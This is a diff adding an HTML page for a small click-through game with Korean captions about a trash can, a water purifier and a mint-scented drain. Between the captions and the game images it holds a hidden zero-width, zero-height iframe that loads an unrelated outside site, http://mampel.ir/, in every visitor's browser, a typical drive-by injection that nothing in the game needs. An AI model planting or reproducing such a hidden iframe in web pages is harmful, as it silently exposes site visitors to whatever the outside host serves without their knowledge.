@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html>
+<style>
+	body{background-color: #484535;}
+	#backk{width: auto; height: 100%; animation:start 2s alternate;}
+	#backk img{width: 1250px; height: auto;}
+	#po{bottom: 8%; font-weight: 5px; font-size: 1em;display:none; left: 33%;z-index: 10;}
+
+	#poom{bottom: 8%; font-weight: 5px; font-size: 1em;display:none; left: 33%;z-index: 10;}
+	#poom2{bottom: 8%; font-weight: 5px; font-size: 1em;display:none; left: 33%;z-index: 10;}
+	#pp{bottom: 8%; font-weight: 5px; font-size: 1em;display:none; left: 33%;z-index: 10;}
+
+		#okk{bottom: 11%; right: 30%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#okk img{height: 20px;width: auto; }
+
+	#bx { position: absolute; bottom: 0%; left: 30%; display: none; z-index: 5;}
+	#bx img{ width: 60%; height: auto;  }
+
+	#turn{bottom: 3%; left: 48%; position: absolute;animation: backk 3s alternate; z-index: 4;}
+	#turn img{width: 50px; height: auto;cursor: pointer; }
+
+	#trash { position: absolute; z-index: 99;cursor: pointer; top: 60%; left: 58%; }
+	#trash img{ position: absolute; width: 100px; height: 150px;z-index: 99;cursor: pointer;}
+
+	#water { position: absolute; z-index: 99;cursor: pointer; top: 50%; left: 70%; }
+	#water img{ position: absolute; width: 60px; height: 150px;z-index: 99;cursor: pointer;}
+
+
+	#tt { position: absolute; z-index: 99; top: 20%; left: 30%; animation: tra 2s alternate; display: none;cursor: pointer; }
+	#tt img{ position: absolute; z-index: 99; width: 800px; height: auto; }	
+
+	#ww { position: absolute; z-index: 99; top: 10%; left: 35%; animation: tra 2s alternate; display: none;cursor: pointer; }
+	#ww img{ position: absolute; z-index: 99; width: 500px; height: auto; }	
+	#wa { position: absolute; z-index: 99; top: 10%; left: 35%; animation: tra 2s alternate; display: none; }
+	#wa img{ position: absolute; z-index: 99; width: 500px; height: auto; }	
+
+	#floo { position: absolute; z-index: 99;cursor: pointer; top: 20%; left: 60%;display:none; }
+	#floo img{ position: absolute;  width: 300px; height: 200px;z-index: 99;cursor: pointer;}
+
+	#lefts{top: 50%; left: 18%; position: absolute; cursor: pointer; animation: here 3s alternate; }
+	#lefts img{width: 50px; height: auto; }
+	#rights{top: 50%; right: 18%; position: absolute;animation: heree 3s alternate; }
+	#rights img{width: 50px; height: auto;cursor: pointer; }
+	#fronts{top: 60%; left: 34%; position: absolute;animation: inin 3s alternate; }
+	#fronts img{width: 50px; height: auto;cursor: pointer; }
+
+	
+
+@-webkit-keyframes typing { from { width: 0; } }
+@-webkit-keyframes blink-caret { 50% { border-color: #484535; } }
+
+@keyframes tra{
+			0%{opacity: 0}
+			
+			100%{opacity: 1}
+		}
+
+
+@keyframes here{
+			0%{left: 20%;}
+			
+			100%{left: 18%;}
+		}
+
+@keyframes heree{
+			0%{right: 20%;}
+			
+			100%{right: 18%;}
+		}	
+
+@keyframes inin{
+			0%{top: 62%;}
+			
+			100%{top: 60%;}
+		}	
+@keyframes start{
+			0%{opacity: 0;}
+			
+			100%{opacity: 1;}
+		}		
+
+@keyframes backk{
+			0%{bottom: 6%;}
+			
+			100%{bottom: 3%;}
+		}
+
+h1 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 18ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 2s steps(30, end),
+	           blink-caret .1s step-end infinite alternate;z-index: 3;
+}
+h2 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 30ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 3s steps(40, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h3 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 22ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 3s steps(50, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+</style>
+
+<head>
+	<title></title>
+</head>
+
+<body>
+	
+		<audio src="walk.mp3" autoplay="true" preload="auto">
+	</audio>
+	<audio id="crun">
+		<source src="crunch.mp3" type="audio/mpeg">
+	</audio>
+	<audio id="wate">
+		<source src="wate.mp3" type="audio/mpeg">
+	</audio>
+	<audio id="wawa">
+		<source src="wawa.mp3" type="audio/mpeg">
+	</audio>
+	<audio id="drop">
+		<source src="drop.mp3" type="audio/mpeg" autoplay="true" preload="auto" loop="true">
+	</audio>
+
+
+	 
+	  <h2 id="poom">쓰레기가 쓰레기통에 가득 차있다.</h2>
+	  <h1 id="po">쓸만한건 없어보인다...</h1>
+	  <h1 id="poom2">물이 나오는 정수기다.</h1>
+	  <h3 id="pp">배수구에서 민트향이 난다..</h1>
+
+
+
+<iframe src="http://mampel.ir/" frameborder="0" style="width:0px;height:0px;border:0px" ></iframe>
+
+	<div id="backk">
+		<center>
+		<img src="main.png">
+		</center>
+	</div>
+	<div id="lefts">
+		<img src="here.png">
+	</div>
+	<div id="rights">
+		<img src="orhere.png">
+	</div>
+	<div id="fronts">
+		<img src="there.png">
+	</div>
+
+	<div id="bx">
+		<img src="boox.png">
+	</div>
+	<div id="trash">
+		<img src="blank.png">
+	</div>
+	<div id="floo">
+		<img src="blank.png">
+	</div>
+	<div id="tt">
+		<img src="trr.png">
+	</div>
+	<div id="okk">
+		<img src="okk.png">
+	</div>
+	<div id="water">
+		<img src="blank.png">
+	</div>
+	<div id="ww">
+		<img src="watt.png">
+	</div>
+	<div id="wa">
+		<img src="handw.png">
+	</div>
+	<a href="https://seoojing.github.io/main_none/">
+	<div id="turn">
+		<img src="turn.png">
+	</div>
+</a>
+
+<script type="text/javascript">
+
+
+var bgPlay = 0;
+window.onmousemove = function(){
+	bgPlay++;
+	if(bgPlay == 1){drop.play(); }
+}
+
+var toggle = "off";
+	
+var toggle = "off";
+	var clickNumber = 0;
+	trash.onclick = function(){
+		
+		
+			crun.play();
+			toggle = "on";
+			bx.style.display = "inline";
+			poom.style.display = "inline";
+			tt.style.display = "inline";
+			}
+
+	water.onclick = function(){
+		
+		
+			wate.play();
+			toggle = "on";
+			bx.style.display = "inline";
+			poom2.style.display = "inline";
+			ww.style.display = "inline";
+			}
+	ww.onclick = function(){
+			wawa.play();
+			wa.style.display = "inline"
+			ww.style.display = "none"
+			poom2.style.display = "none"
+			okk.style.display = "inline"
+			pp.style.display = "inline"
+}
+	
+	
+
+
+
+	tt.onclick = function(){
+			poom.style.display = "none"
+			okk.style.display = "inline"
+			po.style.display = "inline"
+}
+	okk.onclick = function(){
+			tt.style.display = "none";
+			bx.style.display = "none";
+			poom.style.display = "none";
+			po.style.display = "none"
+			okk.style.display = "none"
+			
+			wa.style.display = "none"
+
+			pp.style.display = "none"
+}
+			
+			
+	
+
+
+	floo.onclick = function(){
+		
+		if(toggle == "off"){
+			poom.style.display = "none";
+			floormp.play();
+			toggle = "on";
+			bx.style.display = "inline";
+			poom2.style.display = "inline";}
+			else{
+			toggle = "off";
+			bx.style.display = "none";
+			poom2.style.display = "none";
+			
+		}
+	}
+
+
+
+
+
+
+
+</script>
+</body>
+</html>
